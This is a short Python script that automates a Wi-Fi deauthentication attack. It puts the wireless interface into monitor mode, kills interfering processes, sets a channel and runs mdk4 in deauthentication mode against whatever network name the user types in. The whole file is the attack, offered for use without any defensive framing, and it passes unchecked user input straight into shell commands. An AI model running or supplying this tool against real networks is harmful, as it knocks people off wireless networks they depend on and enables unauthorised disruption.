import os 
interface = "wlan0"
os.system(f"sudo airmon-ng start {interface}")
os.system("sudo airmon-ng check kill")
ent_ch = input("enter your network channel: ")
os.system(f"sudo iwconfig {interface} channel {ent_ch}")
try: 
  ssid = input("enter the ssid/name_of_the_wifi of the router: ")
  os.system(f"sudo mdk4 {interface} d -E {ssid}")
except KeyboardInterrupt:
  print("exited")

